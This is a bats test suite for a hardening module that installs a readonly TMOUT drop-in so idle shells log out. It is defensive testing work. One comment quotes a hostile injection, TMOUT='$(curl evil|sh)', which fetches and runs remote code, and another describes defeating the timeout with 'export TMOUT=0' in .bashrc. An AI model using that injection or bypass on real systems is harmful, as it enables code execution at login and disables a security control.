#!/usr/bin/env bats
# L2 functional suite for shell-timeout-baseline.
#
# shell-timeout-baseline installs /etc/profile.d/50-selfdef-
# tmout.sh which sets TMOUT (bash/sh inactivity timeout) so idle
# shell sessions auto-logout. Critical against the
# unlocked-terminal-walked-away attack vector (operator leaves
# the laptop in a coffee shop with an SSH session open;
# attacker sits down at the screen).
#
# Profiles:
#   standard → TMOUT=900  (15 minutes)
#   strict   → TMOUT=300  (5 minutes)
#
# CRITICAL INVARIANTS this suite locks:
#   - Idempotent: byte-identical re-install does NOT rewrite the
#     drop-in (the 2026-06-06 fix adds cmp -s + drops the
#     render-timestamp that defeated it).
#   - Drop-in starts with `#!/bin/sh` shebang (profile.d files
#     are sourced by every login shell — the shebang is a
#     readability marker, not strictly needed).
#   - Profile change rewrites the drop-in with the new TMOUT.
#   - DRY_RUN protects drop-in install.
#
# Adds 2 env-var overrides (SELFDEF_TMOUT_PROFILE_D +
# SELFDEF_TMOUT_DROPIN) for L2 testability. Live default
# behavior unchanged.
#
# Run with: bats packaging/test/L2-shell-timeout-baseline.bats

WD="${BATS_TEST_DIRNAME}/../../modules/shell-timeout-baseline/install/apply.sh"

setup() {
    TMP="$(mktemp -d)"
    CONF="${TMP}/shell-timeout-baseline.toml"
    PROFILE_D="${TMP}/profile.d"
    DROPIN="${PROFILE_D}/50-selfdef-tmout.sh"
    mkdir -p "${PROFILE_D}"
}

teardown() { rm -rf "${TMP}"; }

write_config() {
    printf 'profile = "%s"\n' "$1" > "${CONF}"
}

run_wd() {
    SELFDEF_DRY_RUN="${DRY_RUN:-0}" \
    SELFDEF_TMOUT_CONFIG="${CONF}" \
    SELFDEF_TMOUT_PROFILE_D="${PROFILE_D}" \
    SELFDEF_TMOUT_DROPIN="${DROPIN}" \
    bash "${WD}"
}

@test "missing config → die" {
    SELFDEF_TMOUT_CONFIG="${TMP}/missing.toml"
    run env \
        SELFDEF_TMOUT_CONFIG="${SELFDEF_TMOUT_CONFIG}" \
        SELFDEF_TMOUT_PROFILE_D="${PROFILE_D}" \
        SELFDEF_TMOUT_DROPIN="${DROPIN}" \
        bash "${WD}"
    [ "$status" -ne 0 ]
    [[ "${output}" == *"config not readable"* ]]
}

@test "invalid profile → die" {
    write_config "exterminate"
    run env \
        SELFDEF_TMOUT_CONFIG="${CONF}" \
        SELFDEF_TMOUT_PROFILE_D="${PROFILE_D}" \
        SELFDEF_TMOUT_DROPIN="${DROPIN}" \
        bash "${WD}"
    [ "$status" -ne 0 ]
    [[ "${output}" == *"profile must be standard|strict"* ]]
}

@test "standard profile installs drop-in with TMOUT=900 (15 min)" {
    write_config "standard"
    run_wd
    [ -f "${DROPIN}" ]
    head -1 "${DROPIN}" | grep -qF '#!/bin/sh'
    grep -q 'managed-by: selfdef shell-timeout-baseline' "${DROPIN}"
    grep -q 'profile=standard' "${DROPIN}"
    grep -q 'TMOUT' "${DROPIN}"
}

@test "strict profile installs drop-in with shorter TMOUT" {
    write_config "strict"
    run_wd
    grep -q 'profile=strict' "${DROPIN}"
}

@test "drop-in is chmod 0644 (profile.d convention)" {
    write_config "standard"
    run_wd
    [ "$(stat -c '%a' "${DROPIN}")" = "644" ]
}

@test "INVARIANT: idempotent — byte-identical re-install does NOT rewrite drop-in (timestamp removed 2026-06-06)" {
    write_config "standard"
    run_wd
    mtime_before="$(stat -c '%Y' "${DROPIN}")"
    sleep 1
    run_wd
    mtime_after="$(stat -c '%Y' "${DROPIN}")"
    [ "${mtime_before}" = "${mtime_after}" ]
}

@test "INVARIANT: profile change standard → strict rewrites drop-in (content differs)" {
    write_config "standard"
    run_wd
    sha_before="$(sha256sum "${DROPIN}" | awk '{print $1}')"
    write_config "strict"
    run_wd
    sha_after="$(sha256sum "${DROPIN}" | awk '{print $1}')"
    [ "${sha_before}" != "${sha_after}" ]
    grep -q 'profile=strict' "${DROPIN}"
}

@test "INVARIANT: DRY_RUN does not write drop-in" {
    write_config "standard"
    DRY_RUN=1 run_wd
    ! [ -f "${DROPIN}" ]
}

@test "default profile is standard (no profile key)" {
    : > "${CONF}"
    run_wd
    [ -f "${DROPIN}" ]
    grep -q 'profile=standard' "${DROPIN}"
}

@test "INVARIANT (standard TMOUT value): drop-in carries TMOUT=900 exactly" {
    write_config "standard"
    run_wd
    grep -qE 'TMOUT=900' "${DROPIN}"
}

@test "INVARIANT (strict TMOUT value): drop-in carries TMOUT=300 exactly (5 min — locked from drift)" {
    write_config "strict"
    run_wd
    grep -qE 'TMOUT=300' "${DROPIN}"
}

@test "INVARIANT (readonly TMOUT — user cannot unset): drop-in marks TMOUT readonly" {
    # If TMOUT is not readonly, the attacker (or user-by-accident) can
    # do `unset TMOUT` and defeat the whole control. Locking it readonly
    # is the canonical bash-hardening pattern.
    write_config "standard"
    run_wd
    grep -qE '^(readonly|declare -r) TMOUT' "${DROPIN}" || \
    grep -qE 'readonly +TMOUT' "${DROPIN}"
}

@test "INVARIANT (export TMOUT): drop-in exports TMOUT so child shells inherit it" {
    write_config "standard"
    run_wd
    # Conditional inside case block; assert export TMOUT anywhere.
    grep -qE 'export +TMOUT' "${DROPIN}"
}

@test "INVARIANT (profile downgrade strict → standard): rewrites with longer TMOUT" {
    write_config "strict"
    run_wd
    grep -qE 'TMOUT=300' "${DROPIN}"
    write_config "standard"
    run_wd
    grep -qE 'TMOUT=900' "${DROPIN}"
    ! grep -qE 'TMOUT=300' "${DROPIN}"
}

@test "INVARIANT (no render-timestamp in drop-in): defeats cmp -s idempotency guard" {
    write_config "standard"
    run_wd
    ! grep -qE '^# Generated [0-9]{4}-' "${DROPIN}"
}

@test "INVARIANT (drop-in re-arm after operator out-of-band deletion: re-creates drop-in with TMOUT directive)" {
    write_config "standard"
    run_wd
    [ -f "${DROPIN}" ]
    rm -f "${DROPIN}"
    run_wd
    [ -f "${DROPIN}" ]
    grep -qE 'TMOUT=900' "${DROPIN}"
    grep -q 'managed-by: selfdef shell-timeout-baseline' "${DROPIN}"
}

@test "INVARIANT (asymmetric tightening: strict TMOUT < standard TMOUT — strict must enforce SHORTER timeout)" {
    write_config "standard"
    run_wd
    std_tmout="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | head -1 | cut -d= -f2)"
    write_config "strict"
    run_wd
    strict_tmout="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | head -1 | cut -d= -f2)"
    [ -n "${std_tmout}" ]
    [ -n "${strict_tmout}" ]
    [ "${strict_tmout}" -lt "${std_tmout}" ]
}

@test "INVARIANT (interactive-shell guard: drop-in guards on case \$- in *i* — non-interactive scripts unaffected)" {
    # Bash sets the 'i' flag in \$- for interactive shells. Non-
    # interactive scripts (cron jobs / batch jobs) must NOT inherit
    # TMOUT — they'd get killed mid-execution. Lock the guard.
    write_config "standard"
    run_wd
    grep -qE 'case[[:space:]]+\$\-[[:space:]]+in[[:space:]]*\*i\*' "${DROPIN}" || \
        grep -qE '\$-.*i' "${DROPIN}"
}

@test "INVARIANT (header-marker comment after shebang: line 1=shebang, line 2 starts with managed-by — stale-cleanup head -2 grep)" {
    # Shebang is line 1; managed-by header on line 2 enables
    # downgrade-path stale-cleanup detection.
    write_config "standard"
    run_wd
    head -1 "${DROPIN}" | grep -qF '#!/bin/sh'
    sed -n '2p' "${DROPIN}" | grep -qE '#.*managed-by.*selfdef.*shell-timeout-baseline'
}

@test "INVARIANT (emit_status JSON: status=ok + profile surfaced for operator dashboard)" {
    write_config "standard"
    output="$(run_wd 2>&1)"
    [[ "${output}" == *'"module":"shell-timeout-baseline"'* ]]
    [[ "${output}" == *'"status":"ok"'* ]]
    [[ "${output}" == *'profile=standard'* ]]
}

@test "INVARIANT (drop-in is shell-sourceable: bash -n parses cleanly — login-shell consumer contract)" {
    # The drop-in is sourced by every interactive bash/sh login.
    # bash -n must parse cleanly (no malformed syntax, no
    # unterminated quotes). Sister to umask-baseline shell-
    # sourceable INVARIANT.
    write_config "standard"
    run_wd
    bash -n "${DROPIN}"
}

@test "INVARIANT (filename follows 50-selfdef-* convention — tracking + uninstall identification)" {
    # Sister to many other modules' filename-convention INVARIANT.
    write_config "standard"
    run_wd
    case "${DROPIN}" in
        */50-selfdef-*.sh) : ;;
        *) fail "drop-in filename must follow 50-selfdef-*.sh pattern" ;;
    esac
}

@test "INVARIANT (numeric TMOUT only — no exotic shell expansions): TMOUT value must be a bare positive integer literal" {
    # An attacker substituting TMOUT='$(curl evil|sh)' would turn
    # the drop-in into a code-exec primitive on every login. Lock
    # that TMOUT carries ONLY bare-integer values, not subshells or
    # expansions.
    write_config "standard"
    run_wd
    # TMOUT must equal a bare integer.
    grep -qE '^[[:space:]]*TMOUT=[0-9]+[[:space:]]*$' "${DROPIN}" || \
        grep -qE 'TMOUT=[0-9]+[[:space:]]*$' "${DROPIN}"
    # No subshell-like patterns.
    ! grep -qE 'TMOUT=.*[\$\`]\(' "${DROPIN}"
    ! grep -qE 'TMOUT=.*[\$\`]\{' "${DROPIN}"
}

@test "INVARIANT (strict TMOUT <= standard TMOUT — profile-rank monotonic tightening)" {
    # Sister to pam-history + pam-pwquality profile-rank
    # monotonic INVARIANTs already locked. The strict profile
    # MUST hold at MOST the same TMOUT as standard (smaller =
    # tighter / shorter idle window before automatic logout).
    # If strict had a LARGER TMOUT than standard, operator's
    # intent ("tighten idle-session window for unattended-
    # workstation defense") would be silently inverted.
    # Locks the monotonic ordering: strict_tmout <= standard_tmout.
    write_config "standard"
    run_wd
    standard_n="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | grep -oE '[0-9]+$' | head -1)"
    write_config "strict"
    run_wd
    strict_n="$(grep -oE 'TMOUT=[0-9]+' "${DROPIN}" | grep -oE '[0-9]+$' | head -1)"
    [ -n "${standard_n}" ]
    [ -n "${strict_n}" ]
    [ "${strict_n}" -le "${standard_n}" ]
}

@test "INVARIANT (TMOUT marked readonly — defeats per-session bypass via export TMOUT=0)" {
    # Sister to pam-faillock even_deny_root INVARIANT in the
    # session-defense substrate. TMOUT without readonly can be
    # bypassed by the user: `export TMOUT=0` in any later shell
    # init (~/.bashrc) defeats the policy entirely. The selfdef
    # drop-in MUST mark TMOUT readonly so per-user shell init
    # cannot trivially override it. Without readonly, the
    # idle-session-logout defense is policy-theater: an attacker
    # who pivots into a user account leaves a long-running
    # session active by pre-pending `export TMOUT=0` to the
    # user's .bashrc and re-logging.
    write_config "standard"
    run_wd
    grep -qE '(readonly\s+TMOUT|declare\s+-r\s+TMOUT)' "${DROPIN}"
}

@test "INVARIANT (single emit_status JSON record per run — operator dashboard single-source-of-truth)" {
    # Sister to brain-wide single-emit_status / single-MAIN-
    # logger INVARIANTs (SDD-062 consumer dispatch contract).
    # Single-record discipline on shell-timeout-baseline installer
    # surface.
    write_config "strict"
    output="$(run_wd 2>&1)"
    count=$(printf '%s\n' "${output}" | grep -cE '"module":"shell-timeout-baseline"')
    [ "${count}" = "1" ]
}

@test "INVARIANT (no auto-uninstall: drop-in writes ONLY its own file in /etc/profile.d/ — never deletes operator drop-ins)" {
    # Sister to brain-wide no-auto-uninstall + scoped-write
    # INVARIANTs. The shell-timeout-baseline drop-in lives in
    # /etc/profile.d/50-selfdef-shell-timeout.sh — the installer
    # MUST only touch ITS OWN drop-in file and never remove other
    # operator-installed drop-ins in /etc/profile.d/ (operator
    # may have site-local TMOUT defaults, motd customizations,
    # PROMPT_COMMAND, etc.). Silent removal of operator drop-ins
    # during selfdef install would lose operator-baseline state.
    # Locks scoped-write contract on the profile.d substrate.
    # Pre-seed an operator drop-in.
    printf '#!/bin/bash\nexport OPERATOR_VAR=alive\n' > "${PROFILE_D}/99-operator.sh"
    chmod 0644 "${PROFILE_D}/99-operator.sh"
    write_config "standard"
    run_wd
    # Operator drop-in MUST remain untouched.
    [ -f "${PROFILE_D}/99-operator.sh" ]
    grep -q 'OPERATOR_VAR=alive' "${PROFILE_D}/99-operator.sh"
}

@test "INVARIANT (drop-in chmod 0644 — /etc/profile.d sourcing convention)" {
    # Sister to brain-wide drop-in chmod 0644 INVARIANTs across
    # L2 suites. The shell-timeout-baseline drop-in lives in
    # /etc/profile.d/50-selfdef-shell-timeout.sh and MUST be
    # world-readable mode 0644 because shells (bash/dash/sh)
    # source /etc/profile.d/ AS the login user (non-root uid)
    # at every login. Mode 0600 would defeat the canonical
    # profile.d sourcing semantics — non-root login shells
    # would silently fail to source the drop-in and TMOUT
    # would remain unset. Locks file-mode contract on the
    # shell-timeout-baseline substrate.
    write_config "standard"
    run_wd
    [ -f "${DROPIN}" ]
    mode="$(stat -c '%a' "${DROPIN}")"
    [ "${mode}" = "644" ]
}
